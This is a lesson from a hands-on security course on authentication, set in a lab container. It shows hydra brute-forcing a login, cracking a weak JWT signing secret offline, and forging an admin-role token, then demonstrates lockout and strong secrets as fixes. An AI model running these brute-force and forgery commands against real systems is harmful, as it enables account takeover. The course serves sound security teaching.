# Day 4 — Authentication & Identity

## Objectives

By the end of today you should be able to:

- Explain what a **session**, a **cookie**, and a **JWT** each actually are — precisely
  enough to say which one is stateful and which is stateless, and why that difference
  matters for what an attacker can do with a stolen or forged one.
- Brute-force a weak login with `hydra`, and say in one sentence why the *identical*
  attack does nothing against a login endpoint that rate-limits and locks out.
- Decode a JWT's claims without any secret at all, then explain precisely why *reading*
  a JWT needs nothing but *changing* one undetected needs the signing secret.
- Crack a JWT's guessable HMAC secret offline, forge a brand-new token with an elevated
  `role` claim, and use it to reach an endpoint no real account on the target can reach.
- Name why a verifier that trusts a JWT's own `alg` header (accepting `alg: none`) is a
  categorically different, worse bug than a guessable-but-fixed-algorithm secret — and
  say honestly that today's lab demonstrates the second, not the first.
- List concrete, specific controls (lockout, strong secrets, session regeneration, MFA)
  and match each one to the exact attack it stops.

## 1. Concept — Sessions, Cookies, JWTs, and Where Auth Breaks

### Authentication vs. authorization — two different questions

**Authentication** answers "who are you?" (proving identity — a password, a token, a
biometric). **Authorization** answers "what are you allowed to do?" (checking
permissions once identity is established). Today is entirely about authentication —
proving and forging *who* someone is claims to be; Day 9's broken-access-control content
is about authorization — what a *correctly authenticated* user shouldn't be able to
reach. The two fail independently: today's `/api/admin` bug is actually a hybrid of
both, and naming that precisely matters — walk through it once explicitly:

- The **forgery** (Section 2, Steps 4–5) is an *authentication* failure: the token
  claims to be `admin`-privileged, and nothing about the signature check catches that
  the claim is fabricated, because the attacker holds the same secret the verifier
  does.
- The **role check itself** (`if payload.get("role") != "admin"`) is doing correct
  *authorization* — it's checking a claim before granting access. The authorization
  logic isn't broken here; what's broken is that authentication (the signature) no
  longer proves the claim is trustworthy once the secret leaks.

### Sessions and cookies — the stateful model

A **session** is server-side state ("this identifier belongs to this logged-in user"),
looked up by an opaque identifier a **cookie** carries automatically on every request.
The server holds the actual state; the cookie is just a pointer to it. This is why
logging out (server deletes the session record) instantly invalidates the cookie
everywhere, and why a session can be revoked at any time — the server is authoritative.

Two distinct attack classes target this model, and they are not the same bug:

- **Session hijacking** — an attacker steals an *already-valid* session identifier
  directly (reading it off an unencrypted network, XSS reading `document.cookie`, or a
  device left unlocked) and replays it. The fix is protecting the cookie in transit and
  from scripts: `Secure` (HTTPS only), `HttpOnly` (unreadable to JavaScript), and
  `SameSite` (restricts cross-site sending) — Day 7 and Day 9 cover the specific attacks
  each attribute blocks.
- **Session fixation** — an attacker doesn't need to steal anything; instead they get a
  *victim* to authenticate under a session identifier the attacker already knows in
  advance (e.g. by sending the victim a link containing a pre-set session ID, if the
  server is naive enough to honor a client-supplied one). Once the victim logs in under
  that ID, the attacker — who already knew it — is authenticated too. The fix is
  narrower and absolute: **always issue a brand-new session identifier at the moment of
  successful login**, discarding whatever ID (if any) the client presented beforehand.
  Today's target has exactly this bug on purpose (see `target/app.py`'s `login()` —
  it reuses a pre-existing `session` cookie instead of regenerating one), named
  precisely here so you can recognize the pattern in real code, even though this lab's
  hands-on Attack section (Section 2) focuses its live exploitation on the JWT side, not
  this one — an honest scope note, not a glossed-over gap.

### JWTs — the stateless model, and exactly how they break

A **JWT** (JSON Web Token) packs identity claims into the token itself instead of a
server-side lookup: `header.payload.signature`, all three parts base64url-encoded, dot-
separated. Anyone can **decode** a JWT — base64url is not encryption, it's just a text
encoding, so the header and payload are plainly readable by copy-pasting the token into
any base64 decoder. What actually protects a JWT's claims from being *changed*
undetected is the **signature**. For the extremely common `HS256` algorithm (what
today's target uses):

```
signature = HMAC-SHA256(secret, header_b64 + "." + payload_b64)
```

That's the entire mechanism. It means two very different things follow from it, and
today's lab attacks the first one directly:

1. **If you can guess or crack `secret`**, you can compute a valid signature over *any*
   claims you want — including `"role": "admin"` on an identity you don't otherwise
   control — without ever touching a real password again. This is exactly what Section
   2, Steps 4–5 do: the secret here is `"cyberlab"`, short and dictionary-word enough
   that a ten-line wordlist finds it in milliseconds, offline, with zero further
   requests to the server.
2. **If the *verifier's code* trusts the algorithm named inside the token's own
   header** rather than hardcoding which algorithm it expects, a second, historically
   real and separate vulnerability class opens up: `alg: none`. Some JWT libraries, for
   a period, implemented `"none"` as a literal valid algorithm meaning "no signature
   required" — so an attacker could simply rewrite the header to `{"alg":"none"}`,
   leave the payload alone (with any claims edited), drop the signature segment
   entirely, and a verifier that blindly branches on the token's own `alg` field would
   accept it with **no secret knowledge needed at all**. This is strictly worse than
   guessable-secret forgery (Section 1's point 1): guessing a secret still requires
   *some* offline compute; `alg: none` against vulnerable code requires none.
   **Today's target does not have this bug** — its `verify_jwt()` hardcodes HS256 and
   never reads the token's own `alg` field to decide anything, so it's not exploitable
   here (see `target/app.py`'s docstring). Drill 3 below asks you to reason about why
   the trick works against code that *does* trust that field, precisely because this
   lab's target is a clean example of the fix, not the bug.

The trade-off this buys: a JWT needs no server-side lookup to validate (fast,
horizontally scalable, works across services that don't share a session store) — at
the cost that revoking one before its `exp` claim expires is hard (the token stays
valid everywhere it's accepted until it naturally expires, unless you build a separate
revocation/blocklist mechanism, which reintroduces the server-side state a JWT was
chosen to avoid in the first place). **Claims** are simply the JSON key/value pairs
inside the payload — `sub` (subject, i.e. username), `role`, `exp` (expiry, a Unix
timestamp), and conventionally `iss`/`aud` (issuer/audience) in larger systems.

### Brute force, rate limiting, and lockout

**Brute force** just means trying guesses until one works, relying on volume rather
than any cleverness. It splits into two regimes with very different economics:

- **Online brute force** (Section 2, Step 2's `hydra` attack against `/login`) — every
  guess costs a real network round-trip to the target. This is exactly what **rate
  limiting** (capping requests per time window) and **account lockout** (blocking
  further attempts after N failures, regardless of rate) defend against — both make
  each additional guess expensive or impossible, not just slow.
- **Offline brute force** (Section 2, Step 4's JWT-secret crack) — once you have one
  valid token, guessing candidate secrets happens entirely locally; the target server
  is never touched again. Rate limiting the *server* does nothing to slow this down —
  the only real defense is making the secret itself too large a space to guess (a long,
  random value, not a dictionary word) — Defense 2 below.

### MFA and OIDC — the two escapes from "password alone"

**MFA** (Multi-Factor Authentication) requires a second, independent factor beyond a
password — something you *have* (a one-time code, a hardware key) or something you
*are* (biometrics) — so that a correctly-guessed or leaked password alone is no longer
sufficient. It's the single most effective mitigation against both today's attack
classes: even a successfully brute-forced or phished password doesn't get an attacker
in without the second factor.

**OIDC** (OpenID Connect), built on OAuth 2.0, is the practical alternative to writing
your own login system at all: an application delegates "who is this user?" to a
trusted external identity provider, which returns a signed JWT (an ID token) asserting
identity. The shift it represents: instead of every app maintaining its own password
database and reinventing lockout/MFA/session logic (today's whole lab, essentially),
most modern systems federate that responsibility to one hardened provider that's
already solved it. Today's lab intentionally rolls its own auth, badly, so you can see
exactly what OIDC and a real framework's auth library are actually protecting you from.

## 2. Attack Lab — Brute Force, Forge, Escalate

**Authorized use only:** everything below runs against `target`, a container this lab
starts on the shared `cyberlab` network — never against a real login page or a JWT-
issuing service you don't own or don't have explicit written authorization to test.

Bring up both labs (after `labs/base/up.sh` if you haven't already), and stage this
lab's script/wordlists with a plain `cp` (no extra container — `/loot` is just a bind
mount):

```sh
cd cyber_security/labs/base
./up.sh
cd ../day04
docker compose up -d --build
mkdir -p ../base/loot/day04
cp jwt_forge.py passwords.txt secrets.txt ../base/loot/day04/
```

`labs/day04/docker-compose.yml` adds **only** the `target` service — it does not
redefine `attacker`. Every command below runs from `labs/base`, where `attacker` is
actually defined. Full detail: [`labs/day04/README.md`](../labs/day04/README.md).

### Step 1 — Recon the target

```sh
cd cyber_security/labs/base
docker compose exec attacker sh -c "curl -s target:5000/ ; echo"
```

**What you should see:** an HTML fragment naming the four routes —
`GET/POST /login`, `POST /api/token`, `GET /api/whoami`, `GET /api/admin` — this
target hands you its own route map rather than making you `gobuster` for it, since
today's focus is the auth logic behind those routes, not endpoint discovery (Day 8/9's
job).

### Step 2 — Brute force `/login` with `hydra`

```sh
docker compose exec attacker sh -c "hydra -s 5000 -l admin -P /loot/day04/passwords.txt target http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid username or password'"
```

**What you should see:** hydra tries every line in `passwords.txt` against
`username=admin`, and reports one line like:

```
[5000][http-post-form] host: target   login: admin   password: letmein
```

Two things worth naming explicitly, because both look like a broken lab the first time
you hit them and are actually real tool behavior:

- **The `-s 5000` flag is required.** Hydra's `http-post-form` module defaults to port
  80; this target listens on `5000`. Omit `-s 5000` and every single candidate fails
  with `[ERROR] ... cannot connect` — not because the credentials are wrong, but
  because hydra never reached the right port.
- **The `F=` string must match the target's exact failure text.** Hydra's logic is:
  *if the response does NOT contain the `F=` string, treat it as a valid login.*
  `F=Invalid username or password` matches this target's real failure response
  exactly — get that string wrong (extra punctuation, wrong case if you add `C=`
  instead of `F=`, etc.) and hydra will report *every* guess as a valid password, a
  false positive that has nothing to do with the target's real security.

**Cracked credentials: `admin` / `letmein`.** Full captured output:
[`labs/day04/SOLUTION.md`](../labs/day04/SOLUTION.md).

### Step 3 — Get a legitimate JWT, decode it

```sh
docker compose exec attacker sh -c "
TOKEN=\$(curl -s -X POST target:5000/api/token -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"letmein\"}' | jq -r .token)
echo TOKEN=\$TOKEN
python3 /loot/day04/jwt_forge.py decode \$TOKEN
"
```

**What you should see:** the raw token, then its decoded header
(`{'alg': 'HS256', 'typ': 'JWT'}`) and payload
(`{'sub': 'admin', 'role': 'user', 'exp': ...}`). Note this decode step used **no
secret at all** — reading a JWT's claims never requires one; only verifying or forging
a *valid signature* over them does. And note `"role": "user"` — this legitimate token,
honestly obtained with real cracked credentials, still cannot reach `/api/admin` (Step
5 confirms this directly).

### Step 4 — Crack the JWT secret offline

```sh
docker compose exec attacker sh -c "
TOKEN=\$(curl -s -X POST target:5000/api/token -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"letmein\"}' | jq -r .token)
python3 /loot/day04/jwt_forge.py crack \$TOKEN /loot/day04/secrets.txt
"
```

**What you should see:** `SECRET FOUND: cyberlab` — [`jwt_forge.py`](../labs/day04/jwt_forge.py)
recomputes `HMAC-SHA256(candidate, header_b64 + "." + payload_b64)` for every line in
`secrets.txt` and compares it, byte-for-byte, against the token's own signature. This
is entirely offline (Section 1's "offline brute force" point) — no further requests to
`target` happen during this step at all.

### Step 5 — Forge a `role:admin` token and escalate

```sh
docker compose exec attacker sh -c "
FORGED=\$(python3 /loot/day04/jwt_forge.py forge cyberlab '{\"sub\":\"admin\",\"role\":\"admin\",\"exp\":9999999999}')
echo FORGED=\$FORGED
curl -s target:5000/api/admin -H \"Authorization: Bearer \$FORGED\"
echo
"
```

**What you should see:** a brand-new token, computed entirely locally with the cracked
secret, and `{"flag":"CTF{jwt-forged-with-a-guessable-secret}"}` from `/api/admin` — an
endpoint no legitimately-issued token on this target can ever reach, since `admin`'s
own account is hardcoded to `role: user`. As a sanity check that this really is the
signature/claims doing the work (and not some other bug), reusing the Step 3 *legitimate*
token against `/api/admin` returns `{"error":"admin role required"}` — full captured
proof of both in [`labs/day04/SOLUTION.md`](../labs/day04/SOLUTION.md).

### Verify

```sh
cd cyber_security/labs/base
docker compose exec attacker sh -c "hydra -s 5000 -l admin -P /loot/day04/passwords.txt target http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid username or password' -o /loot/day04/hydra_out.txt >/dev/null 2>&1; grep -qi 'login:' /loot/day04/hydra_out.txt && echo ATTACK_OK"
```

Expected: `ATTACK_OK`. Note this deliberately does **not** chain `&& echo ATTACK_OK`
off hydra's own exit code — hydra can exit non-zero by design even on a successful run
(`hydra -h` is one visible example). Instead hydra's report is written to a file
(`-o`), and the pass/fail check comes entirely from `grep` against that file's actual
content, on a separate statement. Full detail: `labs/day04/SOLUTION.md`.

## 3. Defense Lab — Lockout, Strong Secrets, and What's Left as a Checklist

Two fixes re-verified with a real before/after against the exact same code; one fix
(session regeneration) named precisely from Section 1 rather than re-demonstrated here;
MFA and OIDC left as checklist items you'd apply against a real system.

### Defense 1 — Account lockout (re-verified: uncomment, rebuild, re-attack)

`target/app.py`'s `login()` has a lockout block, present but commented out in the
baseline. Uncomment it, then rebuild:

```sh
cd cyber_security/labs/day04
# edit target/app.py: uncomment the block marked
# "Defense Lab, Defense 1: uncomment to enforce a lockout"
docker compose up -d --build
```

Re-run the brute force — but with one change to the hydra command, and this is the
important lesson, not a footnote: add `Account locked` to the `F=` condition as a
second, OR'd failure string:

```sh
cd ../base
docker compose exec attacker sh -c "hydra -t 1 -s 5000 -l admin -P /loot/day04/passwords.txt target http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid username or password|Account locked'"
```

**What you should see:** `1 of 1 target completed, 0 valid password found` — the brute
force fails outright now. **Why the `F=` string had to change:** once lockout is live,
a locked-out response's body is `"Account locked: too many failed attempts..."`, which
does **not** contain the original `F=Invalid username or password` string — and recall
Section 2 Step 2's rule: *hydra treats "doesn't match F" as success.* Tested with only
the original `F=` string, hydra actually reported **7 false-positive "valid"
passwords** after lockout kicked in — a direct, concrete lesson that a naive brute-
force tool's success/failure detection is itself something you have to get right, not
just trust. Hydra's `F=` (and `S=`) condition strings support `|` as OR precisely for
this reason. Full captured before/after: `labs/day04/SOLUTION.md`.

One more honest detail: because `passwords.txt` tries `password`, `123456`, `admin`
before the real password `letmein`, the 3-strikes lockout blocks the attacker's
*eventual correct guess* just as hard as it blocks the wrong ones. That's not a flaw in
the demo — it's the entire point of a lockout: it doesn't distinguish "about to guess
right" from "still guessing wrong," which is exactly why it works against an attacker
who doesn't know in advance which guess is correct.

### Defense 2 — A strong JWT secret (re-verified: edit, rebuild, re-crack)

Change one line in `target/app.py`:

```python
JWT_SECRET = "cyberlab"                                    # before: guessable
JWT_SECRET = "a9f3e8d1c2b7469f8d3a1e5c9b0f7d2e4a6c8b1d3e5f7a9c0b2d4e6f8a1c3e5b"  # after
```

Rebuild, get a fresh token, and re-run the identical Step 4 crack command against the
identical `secrets.txt`:

```sh
cd cyber_security/labs/day04
docker compose up -d --build
cd ../base
docker compose exec attacker sh -c "
TOKEN=\$(curl -s -X POST target:5000/api/token -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"letmein\"}' | jq -r .token)
python3 /loot/day04/jwt_forge.py crack \$TOKEN /loot/day04/secrets.txt
"
```

**What you should see:** `no candidate in wordlist matched` — the exact same forging
technique, against the exact same `verify_jwt()` code, now fails purely because the
secret is out of any reasonably-sized guess space. Nothing about the *logic* changed;
only the secret's entropy did — a direct, concrete illustration that "guessable
secret" (Section 1) is a property of the *value chosen*, not of HMAC or HS256 as
primitives.

### Defense 3 — Named but not re-demonstrated here

- **Session regeneration on login** — the exact fix for Section 1's session-fixation
  bug: always issue a fresh session identifier at successful login, never honor one the
  client already presented. `target/app.py`'s `login()` has this bug on purpose (see
  its code comment); fixing it is a one-line change (`sid = str(uuid.uuid4())`,
  unconditionally) that this lab names precisely but doesn't re-attack-and-reverify
  live, since Section 2's hands-on exploitation focused on the JWT path — an honest
  scope boundary, matching this path's pattern of not overclaiming what a given day's
  lab actually re-verifies.
- **MFA** — described in Section 1; requires a second factor and a real
  TOTP/WebAuthn implementation to demonstrate properly, out of scope for this lab's
  toy target.
- **Short token expiry + explicit `alg` allowlisting** — beyond today's specific
  `exp` claim (already present, 1 hour), a production JWT verifier should also
  explicitly hardcode/allowlist the one algorithm it expects (exactly what this
  target's `verify_jwt()` already does) rather than branch on the token's own `alg`
  field — the concrete fix for the `alg: none` class named in Section 1 and Drill 3.
- **OIDC** — described in Section 1; the practical escape from maintaining any of the
  above yourself.

## 4. Drills

Attempt each drill yourself before reading its solution sketch.

### Drill 1 — Decode and tamper a JWT to elevate role

You're handed this token (a **fresh example**, not the one from Section 2 — decode it
yourself rather than reusing an answer):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJib2IiLCJyb2xlIjoidmlld2VyIiwiZXhwIjo5OTk5OTk5OTk5fQ.REPLACE_ME_SIGNATURE
```

The signing secret happens to be `letmein123`. Using `jwt_forge.py` (or by hand with
`python3 -c` and the same HMAC-SHA256 math from Section 1), decode this token's claims,
then forge a new token for the same `sub` but with `"role": "editor"` instead of
`"viewer"`.

**Hint:** `jwt_forge.py decode <token>` needs no secret at all for this part. Forging
needs `jwt_forge.py forge <secret> '<claims-json>'` — the claims JSON is entirely your
choice; only the *signature* has to be recomputed correctly, over your new payload,
with the correct secret.

**Solution sketch:** decoding shows `{"sub": "bob", "role": "viewer", "exp":
9999999999}`. Forging:

```sh
python3 jwt_forge.py forge letmein123 '{"sub":"bob","role":"editor","exp":9999999999}'
```

produces a new, validly-signed token with `bob` elevated to `editor` — proving the
signature alone (not the username, not anything about `bob` specifically) is what a
verifier trusts, and once you have the secret, you can put *any* claims you want behind
it.

### Drill 2 — Four login-hardening controls and the attack each stops

Name four distinct controls a login endpoint should have, and for each, name the
*specific* attack it stops (not a vague "makes it more secure").

**Hint:** think about what Section 2's `hydra` attack specifically depended on being
absent — unlimited attempts, no delay, no second factor, a guessable password in the
first place — and name the control that removes each dependency.

**Solution sketch:**

1. **Rate limiting** — stops an attacker from sending guesses arbitrarily fast; caps
   the *speed* of an online brute force.
2. **Account lockout** — stops an attacker from ever reaching the correct guess at all
   within a lockout window, regardless of speed; caps the *volume* of attempts (Defense
   1's confirmed before/after above).
3. **MFA** — stops a successful password guess (or a leaked/phished password) from
   being sufficient on its own to log in.
4. **Password strength requirements / breach-list checking** — stops the *specific*
   vulnerability `hydra` exploited in Section 2: `letmein` being a real, in-scope
   password in the first place. Rate limiting and lockout defend a weak password;
   this control prevents the password from being weak to begin with.

### Drill 3 — Why `alg: none` is dangerous

In two or three sentences: explain specifically why a JWT verifier that reads its
expected algorithm from the token's own `alg` header (rather than hardcoding it) can be
tricked into accepting a completely unsigned token, and say why this is a *worse* bug
class than a guessable-but-fixed secret.

**Hint:** name exactly what the verifier is trusting that it shouldn't be — the same
"don't trust client-controlled input to decide your own validation logic" pattern shows
up everywhere in security, this is just one specific, historically real instance of it.

**Solution sketch:** if a verifier's code branches on `token_header["alg"]` to decide
*how* to check the signature, an attacker can simply set that field to `"none"` in a
token they construct themselves; a verifier whose library implements `"none"` as a
literal valid algorithm meaning "no signature required" will accept the token with
whatever claims the attacker wrote, having performed no cryptographic check at all. This
is worse than guessable-secret forgery (Section 1, Section 2 Steps 4–5) because
guessing a secret still costs *some* offline compute against *some* wordlist, however
small — `alg: none` against vulnerable code costs nothing and requires no secret
knowledge whatsoever. The fix is the one this lab's own target already applies:
hardcode the one algorithm you expect (`verify_jwt()` never reads the token's `alg`
field to decide anything) rather than letting the token itself dictate its own
verification rules.

### Drill 4 — Spot the session-fixation bug

Here's a simplified login handler. Find the specific line that creates the
session-fixation vulnerability described in Section 1, and state the one-line fix.

```python
def login(request):
    user = authenticate(request.form["username"], request.form["password"])
    if user is None:
        return "Invalid credentials", 401
    sid = request.cookies.get("session") or generate_new_session_id()
    sessions[sid] = user
    return set_cookie("session", sid)
```

**Hint:** ask exactly what happens if an attacker visits this app first (getting a
session cookie issued to *them*, with no login yet), then tricks a victim into using
that same cookie value when the victim logs in.

**Solution sketch:** the bug is `sid = request.cookies.get("session") or
generate_new_session_id()` — it reuses whatever session cookie the client *already
had* if one is present, only generating a fresh one when there was none at all. An
attacker who visits the app first gets an unauthenticated session cookie issued to
them, plants that exact value on a victim (a crafted link, a shared device, a
subdomain that can set cookies for the parent domain), and once the victim logs in
under that same session ID, the attacker's copy of it is now authenticated as the
victim too — they never needed to steal anything, only to have already known the ID in
advance. The one-line fix: always generate a fresh session ID on successful login,
unconditionally — `sid = generate_new_session_id()`, full stop, regardless of what
cookie (if any) the client presented beforehand.

## 5. Journal Prompt

Open `journal.md` and write today's entry using the template at the top of that file:

- **What I attacked:** name specifically which credentials you brute-forced, which
  secret you cracked, and what claim you forged — versus which part (session
  fixation, `alg: none`) you only reasoned through conceptually via the Concept section
  and Drills 3–4, not against a live target. Being precise about which was hands-on and
  which was conceptual is the same honesty habit Day 3 asked for.
- **How:** walk through hitting the `-s 5000` port gotcha (or avoiding it) and the
  `F=` string gotcha in Section 2 Step 2 — which of those two "this tool quirk isn't a
  broken lab" moments landed hardest?
- **What defended it:** of today's two re-verified defenses (lockout, strong secret),
  which one did you personally uncomment/edit and rebuild, and what changed in the
  observed output before vs. after?
- **What confused me:** anything about *why* reading a JWT's claims needs no secret but
  changing them undetected does, or about why a 3-strikes lockout still blocks the
  attacker's eventual correct guess, that didn't click on first pass.
- **One thing to revisit:** pick one term from today (session, cookie, JWT, claim, MFA,
  brute force, rate limiting, OIDC) to re-explain from memory before Day 5, without
  looking back at this file.
